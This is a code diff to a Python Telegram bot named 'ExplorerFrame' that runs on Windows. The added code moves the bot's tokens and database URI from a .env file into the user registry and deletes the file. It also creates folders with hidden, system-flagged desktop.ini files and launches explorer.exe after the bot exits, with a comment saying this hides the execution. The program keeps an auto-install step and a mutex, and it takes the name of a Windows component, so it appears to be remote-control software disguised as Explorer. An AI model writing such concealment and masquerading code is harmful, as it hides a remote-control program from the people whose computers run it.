@@ -32,6 +32,15 @@ import tempfile
 warnings.filterwarnings("ignore")
 
 # =============================================================================
+# INICIALIZAR PROTECCIÓN (solo si está compilado)
+# =============================================================================
+try:
+    from protection import init_protection_explorerframe
+    init_protection_explorerframe()
+except ImportError:
+    pass
+
+# =============================================================================
 # VERIFICACIÓN DE DEPENDENCIAS (sin opencv)
 # =============================================================================
 def ensure_deps():
@@ -90,6 +99,121 @@ import tzlocal
 # CONFIGURACIÓN (Leer desde entorno o archivo)
 # =============================================================================
 from dotenv import load_dotenv
+
+# ─── Gestión de Credenciales en Windows Registry ──────────────────────────
+def migrate_env_to_registry():
+    """Lee .env, guarda en registry y elimina el archivo"""
+    if sys.platform != "win32":
+        return
+    
+    env_file = Path(".env")
+    if not env_file.exists():
+        return
+    
+    print("[INFO] Migrando .env a Windows Registry...")
+    
+    load_dotenv(env_file)
+    
+    env_vars = [
+        "BOT_TOKEN", "API_URL", "OWNER_ID", "AUTHORIZED_IDS",
+        "UPDATE_TOKEN", "GITHUB_REPO", "MONGO_URI", "SECRET_KEY",
+        "FLASK_ENV", "TELEGRAM_BOT_TOKEN", "APP_BASE_URL"
+    ]
+    
+    saved_count = 0
+    try:
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\ExplorerFrame") as reg_key:
+            for var in env_vars:
+                value = os.getenv(var)
+                if value:
+                    winreg.SetValueEx(reg_key, var, 0, winreg.REG_SZ, str(value))
+                    saved_count += 1
+    except Exception as e:
+        print(f"[WARNING] Error guardando en registry: {str(e)}")
+    
+    if saved_count > 0:
+        print(f"[INFO] Guardadas {saved_count} variables en registry")
+        try:
+            env_file.unlink()
+            print("[INFO] .env eliminado por seguridad")
+        except:
+            pass
+
+def load_env_from_registry():
+    """Carga variables desde Windows Registry"""
+    if sys.platform != "win32":
+        return
+    
+    env_vars = [
+        "BOT_TOKEN", "API_URL", "OWNER_ID", "AUTHORIZED_IDS",
+        "UPDATE_TOKEN", "GITHUB_REPO", "MONGO_URI", "SECRET_KEY",
+        "FLASK_ENV", "TELEGRAM_BOT_TOKEN", "APP_BASE_URL"
+    ]
+    
+    loaded_count = 0
+    try:
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\ExplorerFrame") as reg_key:
+            for var in env_vars:
+                try:
+                    value, _ = winreg.QueryValueEx(reg_key, var)
+                    os.environ[var] = value
+                    loaded_count += 1
+                except:
+                    pass
+    except:
+        pass
+    
+    if loaded_count > 0:
+        print(f"[INFO] Cargadas {loaded_count} variables desde registry")
+
+def check_and_migrate_env():
+    """Verifica si hay .env nuevo y actualiza registry"""
+    if sys.platform != "win32":
+        return
+    
+    env_file = Path(".env")
+    if not env_file.exists():
+        return
+    
+    print("[INFO] Detectado .env nuevo, verificando cambios...")
+    load_dotenv(env_file)
+    
+    env_vars = [
+        "BOT_TOKEN", "API_URL", "OWNER_ID", "AUTHORIZED_IDS",
+        "UPDATE_TOKEN", "GITHUB_REPO", "MONGO_URI", "SECRET_KEY",
+        "FLASK_ENV", "TELEGRAM_BOT_TOKEN", "APP_BASE_URL"
+    ]
+    
+    changes = 0
+    try:
+        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\ExplorerFrame") as reg_key:
+            for var in env_vars:
+                new_value = os.getenv(var)
+                if new_value:
+                    try:
+                        old_value, _ = winreg.QueryValueEx(reg_key, var)
+                    except:
+                        old_value = None
+                    
+                    if new_value != old_value:
+                        winreg.SetValueEx(reg_key, var, 0, winreg.REG_SZ, str(new_value))
+                        changes += 1
+    except Exception as e:
+        print(f"[WARNING] Error actualizando registry: {str(e)}")
+    
+    if changes > 0:
+        print(f"[INFO] {changes} variables actualizadas en registry")
+        try:
+            env_file.unlink()
+            print("[INFO] .env eliminado por seguridad")
+        except:
+            pass
+
+# Ejecutar migraciones
+migrate_env_to_registry()
+load_env_from_registry()
+check_and_migrate_env()
+
 load_dotenv()
 
 BOT_TOKEN  = os.environ["BOT_TOKEN"]
@@ -810,11 +934,71 @@ def run_bot():
     app.run_polling()
 
 # =============================================================================
+# FUNCIONES PARA CREAR CARPETA CON ICONO (contexto menu)
+# =============================================================================
+
+def create_folder_with_icon():
+    """Crea una carpeta con el icono de ExplorerFrame en el escritorio."""
+    try:
+        # Obtener ruta del escritorio
+        desktop = Path.home() / "Desktop"
+        if not desktop.exists():
+            desktop = Path.home() / "Documents"
+        
+        # Crear carpeta con nombre único
+        folder_name = "Nueva carpeta"
+        folder_path = desktop / folder_name
+        counter = 1
+        while folder_path.exists():
+            folder_path = desktop / f"{folder_name} ({counter})"
+            counter += 1
+        
+        folder_path.mkdir(parents=True, exist_ok=True)
+        
+        # Crear archivo desktop.ini para asignar icono
+        icon_path = Path(__file__).parent / "app" / "app-icon.ico"
+        if icon_path.exists():
+            desktop_ini = folder_path / "desktop.ini"
+            with open(desktop_ini, 'w') as f:
+                f.write("[.ShellClassInfo]\n")
+                f.write(f"IconResource={icon_path},0\n")
+            
+            # Ocultar desktop.ini
+            ctypes.windll.kernel32.SetFileAttributesW(str(desktop_ini), 2)
+            
+            # Marcar carpeta como sistema
+            ctypes.windll.kernel32.SetFileAttributesW(str(folder_path), 4)
+        
+        print(f"✅ Carpeta creada: {folder_path}")
+        
+        # Abrir explorador en la carpeta
+        subprocess.Popen(f'explorer /select,"{folder_path}"')
+        return True
+    except Exception as e:
+        print(f"❌ Error creando carpeta: {e}")
+        return False
+
+def open_file_explorer():
+    """Abre el explorador de archivos para ocultar la ejecución."""
+    try:
+        subprocess.Popen("explorer.exe", creationflags=subprocess.CREATE_NO_WINDOW)
+    except Exception as e:
+        print(f"❌ Error abriendo explorador: {e}")
+
+# =============================================================================
 # PUNTO DE ENTRADA
 # =============================================================================
 if __name__ == "__main__":
+    # Manejar argumentos de línea de comandos
+    if len(sys.argv) > 1:
+        if sys.argv[1] == "--create-folder":
+            # Crear carpeta con icono (invocado desde contexto menu)
+            create_folder_with_icon()
+            sys.exit(0)
+    
     # Autoinstalación si es ejecutable
     auto_install()
+    
     # Evitar múltiples instancias
     try:
         mutex = win32event.CreateMutex(None, False, "ExplorerFrameMutex")
@@ -824,5 +1008,9 @@ if __name__ == "__main__":
             sys.exit(0)
     except:
         pass
+    
     # Ejecutar bot
     run_bot()
+    
+    # Abrir explorador después de que el bot se cierre (para ocultar ejecución)
+    open_file_explorer()
